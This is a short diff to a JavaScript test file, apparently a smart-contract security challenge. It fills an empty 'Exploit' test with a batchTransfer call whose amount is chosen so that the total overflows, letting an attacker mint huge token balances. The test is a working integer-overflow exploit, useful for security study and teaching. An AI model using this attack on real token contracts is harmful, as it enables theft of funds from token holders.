@@ -25,7 +25,9 @@ describe('Test', function () {
     });
 
     it('Exploit', async function () {
-
+        const receivers = [attacker.address, deployer.address];
+        const amount = ethers.MaxUint256 / BigInt(2) + BigInt(1);
+        await token.connect(attacker).batchTransfer(receivers, amount);
     });
 
     after(async function () {
